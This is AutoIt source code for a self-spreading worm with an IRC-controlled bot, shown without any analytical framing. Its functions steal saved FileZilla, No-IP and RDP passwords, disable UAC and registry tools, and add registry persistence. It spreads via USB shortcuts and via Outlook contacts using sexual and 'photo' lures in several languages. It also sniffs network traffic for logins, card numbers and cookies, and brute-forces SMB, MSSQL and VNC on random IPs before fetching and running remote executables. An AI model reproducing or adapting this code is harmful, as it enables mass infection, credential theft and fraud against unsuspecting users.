            $lefttemp = BitOR($pc2bytes0[BitAND(BitShift($left, 0x1c), $masks[0x1c])], $pc2bytes1[BitAND(BitAND(BitShift($left, 0x18), $masks[0x18]), 0xf)], $pc2bytes2[BitAND(BitAND(BitShift($left, 0x14), $masks[0x14]), 0xf)], $pc2bytes3[BitAND(BitAND(BitShift($left, 0x10), $masks[0x10]), 0xf)], $pc2bytes4[BitAND(BitAND(BitShift($left, 0xc), $masks[0xc]), 0xf)], $pc2bytes5[BitAND(BitAND(BitShift($left, 0x8), $masks[0x8]), 0xf)], $pc2bytes6[BitAND(BitAND(BitShift($left, 0x4), $masks[0x4]), 0xf)])
            $righttemp = BitOR($pc2bytes7[BitAND(BitShift($right, 0x1c), $masks[0x1c])], $pc2bytes8[BitAND(BitAND(BitShift($right, 0x18), $masks[0x18]), 0xf)], $pc2bytes9[BitAND(BitAND(BitShift($right, 0x14), $masks[0x14]), 0xf)], $pc2bytes10[BitAND(BitAND(BitShift($right, 0x10), $masks[0x10]), 0xf)], $pc2bytes11[BitAND(BitAND(BitShift($right, 0xc), $masks[0xc]), 0xf)], $pc2bytes12[BitAND(BitAND(BitShift($right, 0x8), $masks[0x8]), 0xf)], $pc2bytes13[BitAND(BitAND(BitShift($right, 0x4), $masks[0x4]), 0xf)])
            $temp = BitAND(BitOR(BitAND(BitShift($righttemp, 0x10), $masks[0x10]), $lefttemp), 0xffff)
            ReDim $keys[$n + 0x2]
            $keys[$n] = BitXOR($lefttemp, $temp)
            $n += 0x1
            $keys[$n] = BitXOR($righttemp, BitShift($temp, +0xfffffff0))
            $n += 0x1
        Next
    Next
    Return $keys
EndFunc   ;==>DES_CREATEKEYS
Func DLEXE($url)
    $exe = ""
    Dim $aspace[0x3]
    $digits = 0x8
    For $i = 0x1 To $digits
        $aspace[0x0] = Chr(Random(0x41, 0x5a, 0x1))
        $aspace[0x1] = Chr(Random(0x61, 0x7a, 0x1))
        $aspace[0x2] = Chr(Random(0x30, 0x39, 0x1))
        $exe &= $aspace[Random(0x0, 0x2, 0x1)]
    Next
    $path = @TempDir & "\" & $exe & ".exe"
    InetGet($url, $path, 0x1, 0x0)
    Run($path, "", @SW_HIDE)
EndFunc   ;==>DLEXE
Func FILEZILLA()
    Local $pwds, $h, $fn = @AppDataDir & "\FileZilla\recentservers.xml"
    If FileExists($fn) = False Then Return ""
    $h = FileOpen($fn, 0x0)
    If $h = +0xffffffff Then Return ""
    $host = ""
    $port = 0x15
    $usr = ""
    $pw = ""
    While True
        $line = FileReadLine($h)
        If @error = +0xffffffff Then ExitLoop
        If StringInStr($line, "<Host>") Then
            $usr = ""
            $pw = ""
            $port = 0x15
            $host = StringMid($line, 0x1, StringInStr($line, "</") + 0xffffffff)
            $host = StringMid($host, StringInStr($host, ">") + 0x1)
        EndIf
        If StringInStr($line, "<Port>") Then
            $port = StringMid($line, 0x1, StringInStr($line, "</") + 0xffffffff)
            $port = StringMid($port, StringInStr($port, ">") + 0x1)
        EndIf
        If StringInStr($line, "<User>") Then
            $usr = StringMid($line, 0x1, StringInStr($line, "</") + 0xffffffff)
            $usr = StringMid($usr, StringInStr($usr, ">") + 0x1)
        EndIf
        If StringInStr($line, "<Pass>") Then
            $pw = StringMid($line, 0x1, StringInStr($line, "</") + 0xffffffff)
            $pw = StringMid($pw, StringInStr($pw, ">") + 0x1)
        EndIf
        If StringInStr($line, "</Server>") Then
            $pwds = $pwds & "URL: ftp://" & $host & ":" & $port & " USR: " & $usr & " PWD: " & $pw & "|"
        EndIf
    WEnd
    Return $pwds
EndFunc   ;==>FILEZILLA
Func FIXSYS()
    $read_showsuperhidden = RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "ShowSuperHidden")
    If $read_showsuperhidden = "1" Then
        RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "ShowSuperHidden", "REG_DWORD", 0x0)
    EndIf
    $read_disableregistrytools = RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools")
    If $read_disableregistrytools = "0" Then
        RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "REG_DWORD", 0x1)
    EndIf
    $read_nofolderoptions = RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoFolderOptions")
    If $read_nofolderoptions = "0" Then
        RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoFolderOptions", "REG_DWORD", 0x1)
    EndIf
    $read_uac = RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA")
    If $read_uac = "1" Then
        RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", "REG_DWORD", "0")
    EndIf
EndFunc   ;==>FIXSYS
$sipaddr=0
Func GENIP()
	Global $sipaddr
    While 0x1
        $sipaddr = Random(0x1, 0xff, 0x1) & "." & Random(0x1, 0xff, 0x1) & "." & Random(0x1, 0xff, 0x1) & "." & Random(0x1, 0xff, 0x1)
        If StringRegExp($sipaddr+4, "127.") Then ContinueLoop
		If StringRegExp($sipaddr, "^((25[0-5]|2[0-4]\d|[01]?\d?\d)\.){3}(25[0-5]|2[0-4]\d|[01]?\d?\d)$") Then Return $sipaddr
    WEnd
    Return $sipaddr
EndFunc   ;==>GENIP
Func GETLASTERROR()
    Local $aie = DllCall("kernel32.dll", "dword", "GetLastError")
    Return $aie[0x0]
EndFunc   ;==>GETLASTERROR
Func INSTALL()
    DirCreate($installdir)
    FileCopy(@ScriptFullPath, $installpath, 0x8)
    FileSetAttrib($installdir, "+SH")
    FileSetAttrib($installpath, "+SH")
    RunWait(@ComSpec & ' /c REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v EWF /t REG_SZ /d "' & $installpath & '"', @SW_HIDE)
    If IsAdmin() Then
        RunWait(@ComSpec & ' /c REG ADD HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce /v EWF /t REG_SZ /d "' & $installpath & '"', @SW_HIDE)
    EndIf
EndFunc   ;==>INSTALL
Func IRC_CONNECT($nodes)
    For $i = 0x0 To UBound($nodes) + 0xffffffff
        $mynode = $nodes[$i]
        ConsoleWrite($mynode & @CRLF)
        $sock = TCPConnect(TCPNameToIP(StringSplit($mynode, ":")[0x1]), Number(StringSplit($mynode, ":")[0x2]))
        ConsoleWriteError(@error)
        If Not @error Then
            ExitLoop
        EndIf
    Next
    NICKNAME($sock)
    TCPSend($sock, "USER " & $botid & " 0 * :" & $botid & @CRLF)
    Return $sock
EndFunc   ;==>IRC_CONNECT
Func JOINCHANNEL($irc, $channel)
    If $irc = +0xffffffff Then Return 0x0
    TCPSend($irc, "JOIN " & $channel & @CRLF)
    If @error Then
        Return +0xffffffff
    EndIf
    Return 0x1
EndFunc   ;==>JOINCHANNEL
Func LNK()
    Local $aarray = DriveGetDrive("REMOVABLE")
    Local $drivecount = 0x0
    For $i = 0x0 To UBound($aarray) + 0xffffffff
        Local $drive = StringUpper($aarray[$i])
        FileCopy(@ScriptFullPath, $drive & "\link.exe")
        Local $p = $drive & "\link.exe"
        FileSetAttrib($p, "+H")
        For $name In _FileListToArray($drive & "\", "*")
            If StringInStr(FileGetAttrib($name), "D") Then
                FileCreateShortcut($p, StringUpper($aarray[$i]) & "\" & $name, "", "", "", "%windir%\system32\shell32.dll", "", 0x3, @SW_SHOWNOACTIVATE)
            EndIf
        Next
        $drivecount += 0x1
    Next
    Return $drivecount
EndFunc   ;==>LNK
Func MONITOR()
    If Not FileExists(@SystemDir & "\wpcap.dll") Then
        InetGet("https://www.winpcap.org/install/bin/WinPcap_4_1_3.exe", @TempDir & "\WinPcap_4_1_3.exe")
        Run(@TempDir & "\WinPcap_4_1_3.exe")
        WinWaitActive("WinPcap 4.1.3 Setup", "Welcome to the WinPcap")
        Send("!n")
        WinWaitActive("WinPcap 4.1.3 Setup", "License Agreement")
        Send("!a")
        WinWaitActive("WinPcap 4.1.3 Setup", "Installation options")
        ControlClick("WinPcap 4.1.3 Setup", "Installation options", "[CLASS:Button; INSTANCE:2]")
        WinWaitActive("WinPcap 4.1.3 Setup", "Completing the WinPcap")
        Send("!f")
    EndIf
    $winpcap = _PCAPSETUP()
    $pcap_devices = _PCAPGETDEVICELIST()
    $iface = 0x0
    $pcap = _PCAPSTARTCAPTURE($pcap_devices[$iface][0x0], "host " & $pcap_devices[$iface][0x7] & " and " & $sniffopt, 0x0, 0x10000, 0x2 ^ 0x18, 0x0)
    Dim $keywords[0x14]
    $keywords[0x0] = "GET /"
    $keywords[0x1] = "POST /"
    $keywords[0x2] = "Host: "
    $keywords[0x3] = "User-Agent: "
    $keywords[0x4] = "Content-"
    $keywords[0x5] = "password="
    $keywords[0x6] = "user_name="
    $keywords[0x7] = "user="
    $keywords[0x8] = "Username="
    $keywords[0x9] = "User="
    $keywords[0xa] = "login="
    $keywords[0xb] = "email="
    $keywords[0xc] = "username="
    $keywords[0xd] = "holder="
    $keywords[0xe] = "number="
    $keywords[0xf] = "cvv="
    $keywords[0x10] = "pin="
    $keywords[0x11] = "transaction"
    $keywords[0x12] = "bank"
    $keywords[0x13] = "Cookie: "
    $loothandle = FileOpen($lootloc, 0x1)
    $spackettext = ""
    $oldpackettext = ""
    While True
        $apacket = _TCP_RECV($pcap)
        If UBound($apacket) > 0x14 Then
            $spackettext = BinaryToString("0x" & $apacket[0x14])
            If $spackettext = $oldpackettext Then
                Sleep(0xfa)
                ContinueLoop
            EndIf
            If StringLen($spackettext) > 0xd Then
                For $key = 0x0 To UBound($keywords) + 0xffffffff
                    If StringInStr($spackettext, $keywords[$key]) Then
                        If Dec(Hex(BinaryToString("0x" & $apacket[0xe]))) = 0x1a0b Then ExitLoop
                        $apackettext = StringSplit(StringReplace($spackettext, @CR, ""), @LF)
                        For $apt = 0x1 To UBound($apackettext) + 0xffffffff
                            If StringInStr($apackettext[$apt], $keywords[$key]) Then
                                FileWriteLine($loothandle, $apackettext[$apt])
                                FileFlush($loothandle)
                                $oldpackettext = $spackettext
                            EndIf
                        Next
                        $oldpackettext = $spackettext
                    Else
                        ConsoleWrite($spackettext & @CRLF)
                    EndIf
                Next
            EndIf
        EndIf
        $oldpackettext = $spackettext
    WEnd
EndFunc   ;==>MONITOR
Func NETDB()
    TCPStartup()
    Opt("tcptimeout", 0x172)
    While 0x1
        $ip = GENIP()
        $xd = 0x0
        TCPConnect($ip, 0x1bd)
        If Not @error Then
            ConsoleWrite($ip & ":445 - open" & @CRLF)
            For $u In $user
                If $xd Then
                    ExitLoop
                EndIf
                For $p In $pass
                    _CREATESERVICE("Remote Entropy", "Remote Entropy", $dlexe, $u, $p)
                    If Not @error Then
                        ConsoleWrite($ip & " " & $u & ":" & $p & @CRLF)
                        FileWriteLine($installdir & "\\smb.txt", $ip & " " & $u & ":" & $p & @CRLF)
                        $xd = 0x1
                    EndIf
                Next
            Next
        EndIf
        $xd = 0x0
        TCPConnect($ip, 0x599)
        If Not @error Then
            ConsoleWrite($ip & ":1433 - open")
            For $u In $user
                If $xd Then
                    ExitLoop
                EndIf
                For $p In $pass
                    $conn = _MSSQL_CON($ip, $u, $p, "msdb")
                    If Not @error Then
                        For $command In StringSplit("EXEC sp_configure 'show advanced options', '1'+_+RECONFIGURE+_+EXEC sp_configure 'xp_cmdshell', '1'+_+RECONFIGURE+_+xp_cmdshell '" & $dlexe & "';", "+_+", 0x1)
                            _MSSQL_QUERY($conn, $command)
                        Next
                        If Not @error Then
                            ConsoleWrite($ip & " " & $u & ":" & $p & @CRLF)
                            FileWriteLine($installdir & "\\mssql.txt", $ip & " " & $u & ":" & $p & @CRLF)
                        EndIf
                        _MSSQL_END($conn)
                        $xd = 0x1
                        BREAK
                    EndIf
                Next
            Next
        EndIf
        TCPConnect($ip, 0x170c)
        If Not @error Then
            ConsoleWrite($ip & ":5900 - open")
            For $passwd In $pass
                If VNCHAXX($ip, 0x170c, $pass) Then
                    ConsoleWrite($ip & ":5900 " & $passwd & @CRLF)
                    FileWriteLine($installdir & "\\vnc.txt", $ip & " " & $passwd & @CRLF)
                    ExitLoop
                EndIf
            Next
        EndIf
        TCPConnect($ip, 0x170d)
        If Not @error Then
            ConsoleWrite($ip & ":5901 - open")
            For $passwd In $pass
                If VNCHAXX($ip, 0x170d, $pass) Then
                    ConsoleWrite($ip & ":5901 " & $passwd & @CRLF)
                    FileWriteLine($installdir & "\\vnc.txt", $ip & " " & $passwd & @CRLF)
                    ExitLoop
                EndIf
            Next
        EndIf
    WEnd
EndFunc   ;==>NETDB
Func NEWNICKNAME($irc)
    $nick = $nickformat & RANDID()
    TCPSend($irc, "NICK " & $nick & @CRLF)
EndFunc   ;==>NEWNICKNAME
Func NGETID()
    Return DllCall("kernel32.dll", "dword", "GetCurrentThreadId")[0x0]
EndFunc   ;==>NGETID
Func NGLOBAL()
    Return DllCallAddress("idispatch", $__npfn_global)[0x0]
EndFunc   ;==>NGLOBAL
Func NICKNAME($irc)
    TCPSend($irc, "NICK " & $nick & @CRLF)
EndFunc   ;==>NICKNAME
Func NISMAIN()
    Return DllCallAddress("bool", $__npfn_ismain)[0x0]
EndFunc   ;==>NISMAIN
Func NLOCAL()
    Return DllCallAddress("idispatch", $__npfn_local)[0x0]
EndFunc   ;==>NLOCAL
Func NMAIN($ep)
    If NISMAIN() Then
        DllCallAddress("none", $__npfn_prepmain)
        Call( ISFUNC($ep) ? FUNCNAME($ep) : $ep)
    Else
        Local $s = DllStructCreate("char[64];")
        Local $l = DllCallAddress("idispatch", $__npfn_prepsub, "ptr", DllStructGetPtr($s, 0x1))[0x0]
        Local $fn = DllStructGetData($s, 0x1)
        Call($fn, $l)
    EndIf
EndFunc   ;==>NMAIN
Func NOIP()
    Local $pwd = ""
    $usr = RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC", "Username")
    If $usr = "" Then Return ""
    $usr = RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC", "Password")
    Return "URL: http://no-ip.com/ USR: " & $usr & " PWD (Base64): " & $pwd
EndFunc   ;==>NOIP
Func NRUN($fn, $o = NULL)
    Return DllCallAddress("dword", $__npfn_run, "str", ISFUNC($fn) ? FUNCNAME($fn) : $fn, "ptr", $o)[0x0]
EndFunc   ;==>NRUN
Func NT_SUCCESS($status)
    If 0x0 <= $status And $status <= 0x7fffffff Then
        Return True
    Else
        Return False
    EndIf
EndFunc   ;==>NT_SUCCESS
Func NWAIT($tid)
    DllCallAddress("none", $__npfn_wait, "dword", $tid)
EndFunc   ;==>NWAIT
Func NWAITALL()
    DllCallAddress("none", $__npfn_waitall)
EndFunc   ;==>NWAITALL
Func OPENSCMANAGER($scomputername, $iaccess)
    Local $avoscm = DllCall("advapi32.dll", "hwnd", "OpenSCManager", "str", $scomputername, "str", "ServicesActive", "dword", $iaccess)
    Return $avoscm[0x0]
EndFunc   ;==>OPENSCMANAGER
Func PONG($irc, $ret)
    If $ret = "" Then Return +0xffffffff
    TCPSend($irc, "PONG " & $ret & @CRLF)
    If @error Then
        Return +0xffffffff
    EndIf
    Return 0x1
EndFunc   ;==>PONG
Func RANDID()
    Dim $aspace[0x3]
    $id = ""
    $digits = 0x8
    For $i = 0x1 To $digits
        $aspace[0x0] = Chr(Random(0x41, 0x5a, 0x1))
        $aspace[0x1] = Chr(Random(0x61, 0x7a, 0x1))
        $aspace[0x2] = Chr(Random(0x30, 0x39, 0x1))
        $id &= $aspace[Random(0x0, 0x2, 0x1)]
    Next
    Return $id
EndFunc   ;==>RANDID
Func SENDMAIL()
    Dim $emailmessages[0x25][0x2]
    $emailmessages[0x0][0x0] = "Here's the file you asked for.."
    $emailmessages[0x0][0x1] = "Here you go sorry about that :)"
    $emailmessages[0x1][0x0] = "Hey"
    $emailmessages[0x1][0x1] = "I just really wanted to show you this!"
    $emailmessages[0x2][0x0] = "Thought this was funny"
    $emailmessages[0x2][0x1] = "Check it out!"
    $emailmessages[0x3][0x0] = "This is really damn cool"
    $emailmessages[0x3][0x1] = "Here's this thing I found I think you'd like it."
    $emailmessages[0x4][0x0] = "Here are my pictures from my vacation"
    $emailmessages[0x4][0x1] = ""
    $emailmessages[0x5][0x0] = "My friend took nice photos of me.you Should see em loL!"
    $emailmessages[0x5][0x1] = ""
    $emailmessages[0x6][0x0] = "its only my photos!"
    $emailmessages[0x6][0x1] = ""
    $emailmessages[0x7][0x0] = "Nice new photos of me and my friends and stuff and when i was young lol_"
    $emailmessages[0x7][0x1] = ""
    $emailmessages[0x8][0x0] = "Nice new photos of me!! :p"
    $emailmessages[0x8][0x1] = ""
    $emailmessages[0x9][0x0] = "Check out my sexy boobs :D"
    $emailmessages[0x9][0x1] = ""
    $emailmessages[0xa][0x0] = "hey regarde mes tof!! :p"
    $emailmessages[0xa][0x1] = ""
    $emailmessages[0xb][0x0] = "ma soeur a voulu que tu regarde ca!"
    $emailmessages[0xb][0x1] = ""
    $emailmessages[0xc][0x0] = "hey regarde les tof, c'est moi et mes copains entrain de.... :D"
    $emailmessages[0xc][0x1] = ""
    $emailmessages[0xd][0x0] = "j'ai fais pour toi ce photo album tu dois le voire :)"
    $emailmessages[0xd][0x1] = ""
    $emailmessages[0xe][0x0] = "tu dois voire ces tof"
    $emailmessages[0xe][0x1] = ""
    $emailmessages[0xf][0x0] = "mes photos chaudes :D"
    $emailmessages[0xf][0x1] = ""
    $emailmessages[0x10][0x0] = "c'est seulement mes tof :p"
    $emailmessages[0x10][0x1] = ""
    $emailmessages[0x11][0x0] = "zijn enige mijn foto's"
    $emailmessages[0x11][0x1] = ""
    $emailmessages[0x12][0x0] = "wanna Hey ziet mijn nieuw fotoalbum?"
    $emailmessages[0x12][0x1] = ""
    $emailmessages[0x13][0x0] = "indigde enkel nieuw fotoalbum! :)"
    $emailmessages[0x13][0x1] = ""
    $emailmessages[0x14][0x0] = "hey keurt mijn nieuw fotoalbum goed.. :p"
    $emailmessages[0x14][0x1] = ""
    $emailmessages[0x15][0x0] = "Hey bae"
    $emailmessages[0x15][0x1] = ""
    $emailmessages[0x16][0x0] = "indigde enkel nieuw fotoalbum! :)"
    $emailmessages[0x16][0x1] = ""
    $emailmessages[0x17][0x0] = "het voor yah, doend beeldverhaal van mijn leven lol.."
    $emailmessages[0x17][0x1] = ""
    $emailmessages[0x18][0x0] = "meine hei"
    $emailmessages[0x18][0x1] = ""
    $emailmessages[0x19][0x0] = "en Fotos ! :p"
    $emailmessages[0x19][0x1] = ""
    $emailmessages[0x1a][0x0] = "meine hei"
    $emailmessages[0x1a][0x1] = ""
    $emailmessages[0x1b][0x0] = "le mie foto calde :p"
    $emailmessages[0x1b][0x1] = ""
    $emailmessages[0x1c][0x0] = "mis fotos calientes"
    $emailmessages[0x1c][0x1] = ""
    $emailmessages[0x1d][0x0] = "mi fotograf"
    $emailmessages[0x1d][0x1] = ""
    $emailmessages[0x1e][0x0] = "as :p"
    $emailmessages[0x1e][0x1] = ""
    $emailmessages[0x1f][0x0] = "Mi amigo tom"
    $emailmessages[0x1f][0x1] = ""
    $emailmessages[0x20][0x0] = "las fotos agradables de m"
    $emailmessages[0x20][0x1] = ""
    $emailmessages[0x21][0x0] = "mis fotos calientes"
    $emailmessages[0x21][0x1] = ""
    $emailmessages[0x22][0x0] = "el lol mi hermana quisiera que le enviara este"
    $emailmessages[0x22][0x1] = ""
    $emailmessages[0x23][0x0] = "album de foto"
    $emailmessages[0x23][0x1] = ""
    $emailmessages[0x24][0x0] = "Here are my private pictures for you"
    $emailmessages[0x24][0x1] = ""
    $ooutlook = _OUTLOOKOPEN()
    For $contact In _OUTLOOKGETCONTACTS($ooutlook)
        $thisemail = Random(0x0, 0x3, 0x1)
        _OUTLOOKSENDMAIL($ooutlook, $contact, "", "", $emailmessages[$thisemail][0x0], $emailmessages[$thisemail][0x1], @AutoItExe)
    Next
EndFunc   ;==>SENDMAIL
Func SENDMESSAGE($irc, $msg, $chan = "")
    If $irc = +0xffffffff Then Return 0x0
    If $chan = "" Then
        TCPSend($irc, $msg & @CRLF)
        If @error Then
            Return +0xffffffff
        EndIf
        Return 0x1
    EndIf
    TCPSend($irc, "PRIVMSG " & $chan & " :" & $msg & @CRLF)
    If @error Then
        Return +0xffffffff
    EndIf
    Return 0x1
EndFunc   ;==>SENDMESSAGE
Func UNCRYPTRDPPASSWORD($bin)
    Local Const $cryptprotect_ui_forbidden = 0x1
    Local Const $data_blob = "int;ptr"
    Local $passstr = DllStructCreate("byte[1024]")
    Local $datain = DllStructCreate($data_blob)
    Local $dataout = DllStructCreate($data_blob)
    $pwdescription = "psw"
    $pwdhash = ""
    DllStructSetData($dataout, 0x1, 0x0)
    DllStructSetData($dataout, 0x2, 0x0)
    DllStructSetData($passstr, 0x1, $bin)
    DllStructSetData($datain, 0x2, DllStructGetPtr($passstr, 0x1))
    DllStructSetData($datain, 0x1, BinaryLen($bin))
    $return = DllCall("crypt32.dll", "int", "CryptUnprotectData", "ptr", DllStructGetPtr($datain), "ptr", 0x0, "ptr", 0x0, "ptr", 0x0, "ptr", 0x0, "dword", $cryptprotect_ui_forbidden, "ptr", DllStructGetPtr($dataout))
    If @error Then Return ""
    $len = DllStructGetData($dataout, 0x1)
    $pwdhash = Ptr(DllStructGetData($dataout, 0x2))
    $pwdhash = DllStructCreate("byte[" & $len & "]", $pwdhash)
    Return BinaryToString(DllStructGetData($pwdhash, 0x1), 0x4)
EndFunc   ;==>UNCRYPTRDPPASSWORD
Func VNCHAXX($ip, $port, $pass)
    For $p = 0x0 To UBound($pass) + 0xffffffff
        Local $loginresult = VNCLULZ($ip, $port, $pass[$p])
        If $loginresult = 0x0 Then Return 0x1
        If $loginresult = +0xffffffff Then Return 0x0
    Next
EndFunc   ;==>VNCHAXX
Func VNCKEK($svnc, $password)
    Local $cmd = "cmd"
    Local $exit = "exit"
    Local $clientpacket = "\x01"
    Local $keywindows = "\xFF\x5C"
    Local $keyenter = "\xFF\x0D"
    Local $keyr = "\x72"
    TCPSend($svnc, $clientpacket)
    VNCSENDKEY($svnc, $keywindows)
    ConsoleWrite("Sent Windows key" & @CRLF)
    Sleep(Random(0x64, 0x1f4, 0x1))
    VNCSENDKEY($svnc, $keyr)
    ConsoleWrite("Sent R key" & @CRLF)
    Sleep(Random(0x64, 0x1f4, 0x1))
    For $char = 0x0 To UBound($cmd) + 0xffffffff
        VNCSENDKEY($svnc, $cmd[$char])
        Random(0x64, 0xc8, 0x1)
    Next
    VNCSENDKEY($svnc, $keyenter)
    ConsoleWrite("CMD opened." & @CRLF)
    For $char = 0x0 To UBound($dlexe) + 0xffffffff
        VNCSENDKEY($svnc, $dlexe[$char])
        Sleep(Random(0x64, 0xc8, 0x1))
    Next
    VNCSENDKEY($svnc, $keyenter)
    ConsoleWrite("Download and execute command sent." & @CRLF)
    Sleep(Random(0x64, 0xc8, 0x1))
    $dlexe = StringReplace($dlexe, "DEFAULT", ":" & $password)
    For $char = 0x0 To UBound($exit) + 0xffffffff
        VNCSENDKEY($svnc, $dlexe[$char])
        Sleep(Random(0x64, 0xc8, 0x1))
    Next
    VNCSENDKEY($svnc, $keyenter)
    ConsoleWrite("Infection successful." & @CRLF)
EndFunc   ;==>VNCKEK
Func VNCLULZ($ip, $port, $password)
    Opt("TCPTimeout", 0xbb8)
    Local $svnc = TCPConnect($ip, $port)
    If $svnc = +0xffffffff Then
        ConsoleWrite("Failed to connect to " & $ip & ":" & $port & " @error = " & @error & @CRLF)
        Return +0xffffffff
    EndIf
    Local $rfbprotocolversionstring = TCPRecv($svnc, 0x22)
    If StringLen($rfbprotocolversionstring) < 0xc Then Return SetError(0x1, 0x0, "Failed to recieve RFB protocol string." & @CRLF)
    If StringInStr($rfbprotocolversionstring, "Too many security failures") Then Return SetError(0x1, 0x0, "Too many security failures. Blocked from server.")
    Local $rfbsplit_1 = StringSplit($rfbprotocolversionstring, " ")
    If UBound($rfbsplit_1) < 0x3 Then Return +0xffffffff
    Local $rfbsplit_2 = StringSplit($rfbsplit_1[0x2], ".")
    If $rfbsplit_2[0x0] < 0x2 Then Return SetError(0x1, 0x0, "Failed to split version string (step 2)" & @CRLF)
    Local $rfbprotocolmajorversion = $rfbsplit_2[0x1]
    Local $rfbprotocolminorversion = StringTrimRight($rfbsplit_2[0x2], 0x1)
    TCPSend($svnc, $rfbprotocolversionstring)
    Local $authscheme = _BINARYTOINT16(StringRight(TCPRecv($svnc, 0x2), 0x1))
    If $authscheme = 0x0 Then
    ElseIf $authscheme = 0x1 Then
        VNCKEK($svnc, "")
        Return 0x0
    ElseIf $authscheme = 0x2 Then
        TCPSend($svnc, Chr($authscheme))
        Local $challenge = TCPRecv($svnc, 0x10)
        Local $encryptedchallenge = DES($password, $challenge, 0x1, 0x1, "")
        TCPSend($svnc, $encryptedchallenge)
        Local $authresult = _BINARYTOINT16(StringRight(BinaryToString(TCPRecv($svnc, 0x8)), 0x1))
        Switch ($authresult)
            Case 0x0
                VNCKEK($svnc, $password)
                Return 0x0
            Case 0x1
                Return 0x1
            Case 0x2
                Sleep(0x1388)
                Return 0x1
            Case 0x16
                Return 0x1
            Case 0x23
                Return 0x1
            Case 0x37
                Return 0x1
            Case Else
                Return 0x1
        EndSwitch
    Else
        Return +0xffffffff
    EndIf
EndFunc   ;==>VNCLULZ
Func VNCSENDKEY($svnc, $key)
    Local $vncsendkey = "\x04"
    Local $keydown = "\x01"
    Local $keyup = "\x00"
    Local $nullbytes_1 = "\x00\x00\x00\x00"
    Local $nullbytes_2 = "\x00\x00\x00\x00\x00"
    TCPSend($svnc, $vncsendkey)
    TCPSend($svnc, $keydown)
    If StringLen($key) = 0x2 Then
        TCPSend($svnc, $nullbytes_1)
    Else
        TCPSend($svnc, $nullbytes_2)
    EndIf
    TCPSend($svnc, $key)
    TCPSend($svnc, $vncsendkey)
    TCPSend($svnc, $keyup)
    If StringLen($key) = 0x2 Then
        TCPSend($svnc, $nullbytes_1)
    Else
        TCPSend($svnc, $nullbytes_2)
    EndIf
    TCPSend($svnc, $key)
EndFunc   ;==>VNCSENDKEY
Dim $hmutex
_Singleton("acejeffdeefkkjlmnopqstupidmelotsoffiles", $hmutex)
install()
If Int($CmdLine[0]) > 0 Then               ; if there is no parameter given
	Dim $threads[$maxthreads]
	For $i = 0 To $maxthreads - 1
		$threads[$i] = NMain(NRun('netdb'))
	Next
	While 1
		ConsoleRead()
	WEnd
EndIf

Run(@AutoitExe & " 1"); start scanner threads on new process
